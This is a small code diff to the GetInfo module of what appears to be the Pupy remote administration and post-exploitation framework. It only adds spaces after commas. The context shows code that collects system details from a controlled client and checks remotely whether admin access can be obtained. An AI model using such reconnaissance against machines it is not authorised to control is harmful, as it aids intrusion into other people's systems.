@@ -36,11 +36,11 @@ class GetInfo(PupyModule):
 
         for k in commonKeys:
             if k in self.client.desc:
-                infos.append((k,self.client.desc[k]))
+                infos.append((k, self.client.desc[k]))
 
         if self.client.is_windows():
             for k in windKeys:
-                infos.append((k,self.client.desc[k]))
+                infos.append((k, self.client.desc[k]))
 
             can_get_admin_access = self.client.remote(
                 'pupwinutils.security', 'can_get_admin_access', False)
